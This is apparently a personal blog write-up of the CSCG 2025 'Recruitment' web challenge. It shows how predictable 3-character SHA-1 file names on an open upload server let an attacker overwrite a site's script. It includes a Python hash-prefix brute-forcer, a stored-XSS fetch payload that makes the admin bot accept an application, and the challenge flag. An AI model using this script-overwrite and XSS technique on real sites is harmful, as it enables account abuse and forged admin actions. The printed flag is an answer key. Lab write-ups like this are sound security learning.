---
title: Recruitment - CSCG 2025 - Write-Up
date: 2025-04-24 10:05:00 +0200
categories: [Cyber Security Challenge Germany]
tags: [web,js,xss,bsi,sha1]
description: Exploit a XSS vulnerability.
image:
  path: /assets/blog/Recruitment/txt.png
  alt: CSCG image
---

This is yet another write-up for the challenges of the CSCG 2025 and yet another XSS vulnerability. This is one for the challenge Recruitment, this challenge was created by `TobiNary (BSI)` and rated as medium.

## Description

> Will your application be accepted?
>
> Note: Feel free to use techniques, that lead to high amounts of traffic. But please keep it reasonable and do not DoS us.

This challenge provides you with links to two web applications one on port 5000 the other on port 5004.

## Enumeration of the web app

The port 5004 provides an application page, where you can register and account and submit applications. The web app also allows you to list the applications you submitted. To submit an application you can simply press a button, the app doesn't allow you to submit anything else, it only let's you press a button to do so.

![](/assets/blog/Recruitment/port5004.png)

The listed applications are viewable in the "Show applications" tab:

![](/assets/blog/Recruitment/login.png)

The application on port 5000 provides a small web page and advertises a file uploading service which let's you upload files to the `/service` endpoint using a **put request**.

![](/assets/blog/Recruitment/port5000.png)

The files are uploaded to the `/js` folder and the file gets the name 3 character name ended by the `.js` extension, in my case `954.js`, after uploading. As the description of the file upload service said, there is some hashing algorithm in play.

**Note**: You need to be careful with the new line characters in the request with will result in totally different hashes.

![](/assets/blog/Recruitment/file.png)

To check what partial hash output is I checked a few algorithms, the final one that matched was `sha1`, the first 24 bits of this hash match the file name.

```terminal
$ xxd file    
00000000: 5448 4953 5f49 535f 415f 4649 4c45 0a    THIS_IS_A_FILE.
$ sha1sum file
954a045a86247844889eba5d87bae9962451469b  file
```

The application calculates the hash by generating the **`sha1sum`** of the file and then using these **24 first bits**.

On port 5004 I made the observation that the JS script used in the application is located on the file server.

```html
...
<link rel="stylesheet" href="/static/css.css">
	  <script defer="defer" type="application/javascript" src="https://aaf555d9f8f3158ba8654372-5000-recruitment.challenge.cscg.live:1337/js/1b6.js"></script>
...
```

## Vulnerability

The vulnerability arises because the app for the application submission uses the JavaScript file from the file server where anyone can upload files without authentication.

The file names of the files on the file upload server are generated through a predictable short partial hash, so an attacker is able to overwrite the original JavaScript file used by the application submission app. This is easy for the attacker because the he only needs to brute-force a 3 hex character file name.

This allows **Cross Site Scripting (XSS)** which compromises the application on port 5004.

The attack to achieve the XSS vulnerability is a **Supply Chain Attack**, because you are attacking the hosting service to supply a malicious file to the application submission app. So you are not directly attacking the application submission app.

## Exploit

The vulnerability allows you to craft a malicious JavaScript file. Since the app frequently monitors the applications page using a bot, the code within your JavaScript file gets automatically executed in the bot's web browsing environment.

To find the right hash prefix I build a small Python tool with ChatGPT. This tool will just change data in the file of a predefined string until it finds a hash that matches. The file gets written to `out.js`, so if something valid is found the payload can just be copied from the file.

```python
import hashlib
import itertools
import string

def replace_and_check(input_file, output_file, target_pattern):
    word_to_replace = "BRUTE"
    characters = string.ascii_uppercase

    for replacement in itertools.product(characters, repeat=len(word_to_replace)):
        new_word = ''.join(replacement)

        with open(input_file, "r") as f:
            content = f.read()

        modified_content = content.replace(word_to_replace, new_word)

        with open(output_file, "w") as f:
            f.write(modified_content)

        sha1_hash = hashlib.sha1()
        with open(output_file, "rb") as f:
            while chunk := f.read(4096):
                sha1_hash.update(chunk)

        hash_hex = sha1_hash.hexdigest()
        last_three_chars = hash_hex[:3]

        print(f"Replacing 'BRUTE' with '{new_word}' -> SHA-1: {hash_hex} | Last 3 hex: {last_three_chars}")

        if last_three_chars == target_pattern:
            print("Pattern matched! Stopping.")
            break
        else:
            print("Pattern not matched, retrying...\n")

replace_and_check("payload.js","output.js", "1b6")
```

While looking further for any possible way to get the flag I found this code on the application page (If you click on one of your applications).

```html
<section class="nes-container with-title hidden">
	<h3 class=title>Admin menu</h3>
	<div class=item>
<form action="/application/1" method="post">
	<input class="nes-btn is-success" id="accept" name=action type=submit value="Accept" />
	<input class="nes-btn is-error" id="decline" name=action type=submit value="Decline" />

</form>
	</div>
</section>
```

There is a admin menu, the form allows the admin to accept or decline the application. You could use the XSS vulnerability to use the bots browser to accept your application, which will potentially return the flag.

```js
fetch(`/application/1`, {method: 'POST',headers: {'Content-Type': 'application/x-www-form-urlencoded',},body: 'action=Accept',credentials: 'include'}).then(response => response.text()).then(data => console.log(data)).catch(error => console.error('Error:', error));
x="BRUTE"
```
**Note:** I used a one-liner, because this allows me to replace less `\n\r`'s with `\n`'s'

I used the `BRUTE` value to find some characters which will produce the hash. To find the right value I run my small Python program.

I next copied the payload with the right hash found by the script to my Burp Suite Repeater Tab. Then the final action is to fix the new lines. By default in Burp Suite, if you paste data it will transform a simle new line (`0a`) to a carriage return (`0d0a`).
![](/assets/blog/Recruitment/final.png)


If the payload overwrites the right file it should take a few seconds and the application will be accepted.

**Note:** You may not recognize the flag but its right after accepted in the brackets.

![](/assets/blog/Recruitment/accept.png)

The flag can be found below.


Flag:
```
CSCG{C0ngr4tz_0n_th3_n3w_j0b}
```
